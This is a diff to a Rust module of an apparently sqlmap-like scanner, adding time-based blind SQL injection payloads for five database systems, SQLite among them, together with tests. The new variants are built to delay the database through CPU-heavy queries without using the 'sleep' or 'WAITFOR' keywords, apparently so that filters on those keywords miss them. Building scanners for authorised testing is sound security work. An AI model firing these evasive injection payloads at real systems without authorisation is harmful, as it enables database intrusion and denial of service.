@@ -1,6 +1,8 @@
 #![deny(unsafe_code)]
 
-use crate::dbms::{mssql::payloads as mssql_p, mysql::payloads as mysql_p};
+use crate::dbms::{
+    mssql::payloads as mssql_p, mysql::payloads as mysql_p, sqlite::payloads as sqlite_p,
+};
 
 #[derive(Debug, Clone)]
 #[non_exhaustive]
@@ -42,12 +44,19 @@ pub fn time_payload_for(dbms: Option<&str>, secs: u64) -> TimePayload {
 /// Full per-DBMS payload set: legacy payload first (compat), then
 /// conditional/alternate variants.
 ///
-/// - MySQL: `SLEEP` (legacy), `IF(1=1,SLEEP,0)` conditional, `BENCHMARK` fallback.
+/// - MySQL: `SLEEP` (legacy), `IF(1=1,SLEEP,0)` conditional, `BENCHMARK`
+///   fallback, `BENCHMARK` heavy (`secs`-scaled iterations).
 /// - Postgres: `pg_sleep` (legacy), `CASE WHEN ... THEN pg_sleep` conditional,
-///   `||(SELECT 1 FROM (SELECT pg_sleep..)x)||` inline concat-breakout.
+///   `||(SELECT 1 FROM (SELECT pg_sleep..)x)||` inline concat-breakout,
+///   `generate_series` heavy (no `pg_sleep` keyword, `secs`-scaled rows).
 /// - MSSQL: `WAITFOR DELAY` (legacy, via shared `waitfor_delay_literal`),
-///   `IF(1=1) WAITFOR` conditional.
-/// - Oracle: `DBMS_PIPE.RECEIVE_MESSAGE` (legacy), `DBMS_LOCK.SLEEP` alternate.
+///   `IF(1=1) WAITFOR` conditional, `sysobjects` cartesian heavy (no
+///   `WAITFOR` keyword).
+/// - Oracle: `DBMS_PIPE.RECEIVE_MESSAGE` (legacy), `DBMS_LOCK.SLEEP` alternate,
+///   `all_objects` cartesian heavy (no `sleep` keyword).
+/// - SQLite: heavy-query `RANDOMBLOB` CPU burn (legacy), conditional
+///   `CASE WHEN` heavy variant. No `SLEEP()` on SQLite — blob size scales
+///   with `secs`.
 /// - Generic/`None`: `SLEEP` (legacy) + `IF` conditional.
 ///
 /// # Panics
@@ -61,6 +70,7 @@ pub fn time_payloads_for(dbms: Option<&str>, secs: u64) -> Vec<TimePayload> {
             TimePayload::new(mysql_p::mysql_time_payload(secs), secs, tag.clone()),
             TimePayload::new(mysql_p::mysql_time_conditional(secs), secs, tag.clone()),
             TimePayload::new(mysql_p::mysql_time_benchmark(), secs, tag.clone()),
+            TimePayload::new(mysql_p::mysql_time_heavy(secs), secs, tag.clone()),
         ],
         Some("postgres") => vec![
             TimePayload::new(
@@ -78,10 +88,16 @@ pub fn time_payloads_for(dbms: Option<&str>, secs: u64) -> Vec<TimePayload> {
                 secs,
                 tag.clone(),
             ),
+            TimePayload::new(
+                crate::dbms::postgres::payloads::pg_time_heavy(secs),
+                secs,
+                tag.clone(),
+            ),
         ],
         Some("mssql") => vec![
             TimePayload::new(mssql_p::mssql_time(secs), secs, tag.clone()),
             TimePayload::new(mssql_p::mssql_time_conditional(secs), secs, tag.clone()),
+            TimePayload::new(mssql_p::mssql_time_heavy(), secs, tag.clone()),
         ],
         Some("oracle") => vec![
             TimePayload::new(
@@ -94,6 +110,15 @@ pub fn time_payloads_for(dbms: Option<&str>, secs: u64) -> Vec<TimePayload> {
                 secs,
                 tag.clone(),
             ),
+            TimePayload::new(
+                crate::dbms::oracle::payloads::oracle_time_heavy(),
+                secs,
+                tag.clone(),
+            ),
+        ],
+        Some("sqlite") => vec![
+            TimePayload::new(sqlite_p::sqlite_time(secs), secs, tag.clone()),
+            TimePayload::new(sqlite_p::sqlite_time_conditional(secs), secs, tag.clone()),
         ],
         _ => vec![
             TimePayload::new(format!("' AND SLEEP({secs}) -- -"), secs, tag.clone()),
@@ -103,19 +128,19 @@ pub fn time_payloads_for(dbms: Option<&str>, secs: u64) -> Vec<TimePayload> {
 }
 
 /// Every DBMS-specific time payload (legacy + variants) for blind sweeps
-/// when the backend is unknown. Ordering is stable: all four legacy
-/// payloads first (mysql, postgres, mssql, oracle), then conditional/
-/// alternate variants — so `--level` budgets degrade gracefully to legacy
-/// coverage (L1 = 4 legacies, L2 = legacies + variants).
+/// when the backend is unknown. Ordering is stable: all five legacy
+/// payloads first (mysql, postgres, mssql, oracle, sqlite), then conditional/
+/// alternate/heavy variants — so `--level` budgets degrade gracefully to legacy
+/// coverage (L1 = first 4 legacies, L2 = first 8, L3+ = all 16).
 ///
 /// # Panics
 /// Panics if `secs < 1`.
 #[must_use]
 pub fn all_time_payloads(secs: u64) -> Vec<TimePayload> {
     assert!(secs >= 1, "sleep_secs must be >= 1");
-    let mut legacies = Vec::with_capacity(4);
-    let mut variants = Vec::with_capacity(6);
-    for dbms in ["mysql", "postgres", "mssql", "oracle"] {
+    let mut legacies = Vec::with_capacity(5);
+    let mut variants = Vec::with_capacity(11);
+    for dbms in ["mysql", "postgres", "mssql", "oracle", "sqlite"] {
         let mut v = time_payloads_for(Some(dbms), secs);
         if !v.is_empty() {
             legacies.push(v.remove(0));
@@ -158,6 +183,7 @@ mod tests {
             Some("postgres"),
             Some("mssql"),
             Some("oracle"),
+            Some("sqlite"),
             None,
         ] {
             let legacy = time_payload_for(dbms, 5);
@@ -195,7 +221,7 @@ mod tests {
     #[test]
     fn mysql_has_if_and_benchmark_variants() {
         let v = time_payloads_for(Some("mysql"), 5);
-        assert_eq!(v.len(), 3);
+        assert_eq!(v.len(), 4);
         assert!(
             v[1].payload.contains("IF(1=1,SLEEP(5),0)"),
             "{}",
@@ -206,12 +232,19 @@ mod tests {
             "{}",
             v[2].payload
         );
+        // P0-5 heavy: same channel, `secs`-scaled iterations.
+        assert!(
+            v[3].payload.contains("BENCHMARK(5000000,MD5(1))"),
+            "{}",
+            v[3].payload
+        );
+        assert_eq!(v[3].dbms.as_deref(), Some("mysql"));
     }
 
     #[test]
     fn postgres_has_case_variant() {
         let v = time_payloads_for(Some("postgres"), 5);
-        assert_eq!(v.len(), 3);
+        assert_eq!(v.len(), 4);
         assert!(v[1].payload.contains("CASE WHEN"), "{}", v[1].payload);
         assert!(v[1].payload.contains("pg_sleep(5)"), "{}", v[1].payload);
         assert!(v[2].payload.contains("||"), "{}", v[2].payload);
@@ -221,40 +254,87 @@ mod tests {
             "{}",
             v[2].payload
         );
+        // P0-5 heavy: keyword-free `generate_series` burn, last position
+        // (legacies + sleep variants keep their order).
+        assert!(v[3].payload.contains("generate_series"), "{}", v[3].payload);
+        assert!(
+            !v[3].payload.to_ascii_lowercase().contains("sleep"),
+            "{}",
+            v[3].payload
+        );
     }
 
     #[test]
     fn oracle_has_lock_variant() {
         let v = time_payloads_for(Some("oracle"), 5);
-        assert_eq!(v.len(), 2);
+        assert_eq!(v.len(), 3);
         assert!(
             v[1].payload.contains("DBMS_LOCK.SLEEP(5)"),
             "{}",
             v[1].payload
+        );
+        // P0-5 heavy: dictionary cartesian burn, no sleep-family keyword.
+        assert!(v[2].payload.contains("all_objects"), "{}", v[2].payload);
+        assert!(
+            !v[2].payload.to_ascii_lowercase().contains("sleep"),
+            "{}",
+            v[2].payload
         );
     }
 
     #[test]
     fn mssql_has_conditional_variant() {
         let v = time_payloads_for(Some("mssql"), 5);
-        assert_eq!(v.len(), 2);
+        assert_eq!(v.len(), 3);
         assert!(v[1].payload.contains("IF(1=1)"), "{}", v[1].payload);
         assert!(v[1].payload.contains("00:00:05"), "{}", v[1].payload);
+        // P0-5 heavy: catalog cartesian burn, no WAITFOR keyword.
+        assert!(v[2].payload.contains("sysobjects"), "{}", v[2].payload);
+        assert!(
+            !v[2].payload.to_ascii_lowercase().contains("waitfor"),
+            "{}",
+            v[2].payload
+        );
     }
 
     #[test]
     fn all_payloads_start_with_legacies() {
         let all = all_time_payloads(5);
-        assert_eq!(all.len(), 10);
+        assert_eq!(all.len(), 16);
         assert_eq!(all[0].payload, "' AND SLEEP(5) -- -");
         assert!(all[1].payload.contains("pg_sleep(5)"));
         assert!(all[2].payload.contains("WAITFOR DELAY"));
         assert!(all[3].payload.contains("DBMS_PIPE"));
-        // Variants come after the four legacies.
-        assert!(all[4..].iter().any(|p| p.payload.contains("BENCHMARK")));
+        assert!(all[4].payload.contains("RANDOMBLOB"));
+        // Variants come after the five legacies.
+        assert!(all[5..].iter().any(|p| p.payload.contains("BENCHMARK")));
         assert!(
-            all[4..].iter().any(|p| p.payload.contains("||")
+            all[5..].iter().any(|p| p.payload.contains("||")
                 && p.payload.contains("SELECT 1 FROM (SELECT pg_sleep"))
         );
+        // P0-5 heavies ride last per DBMS, keyword-free where possible.
+        assert!(
+            all[5..]
+                .iter()
+                .any(|p| p.payload.contains("generate_series"))
+        );
+        assert!(all[5..].iter().any(|p| p.payload.contains("sysobjects")));
+        assert!(all[5..].iter().any(|p| p.payload.contains("all_objects")));
+    }
+
+    #[test]
+    fn sqlite_uses_randomblob_heavy_query() {
+        // P0-3/P0-5: SQLite has no SLEEP(); the heavy-query RANDOMBLOB burn
+        // is the time channel.
+        let v = time_payloads_for(Some("sqlite"), 5);
+        assert_eq!(v.len(), 2);
+        assert!(v[0].payload.contains("RANDOMBLOB"), "{}", v[0].payload);
+        assert!(v[0].payload.contains("LIKE('ABCDEFG'"), "{}", v[0].payload);
+        assert!(v[1].payload.contains("CASE WHEN (1=1)"), "{}", v[1].payload);
+        assert!(v[1].payload.contains("RANDOMBLOB"), "{}", v[1].payload);
+        for p in &v {
+            assert_eq!(p.sleep_secs, 5);
+            assert_eq!(p.dbms.as_deref(), Some("sqlite"));
+        }
     }
 }
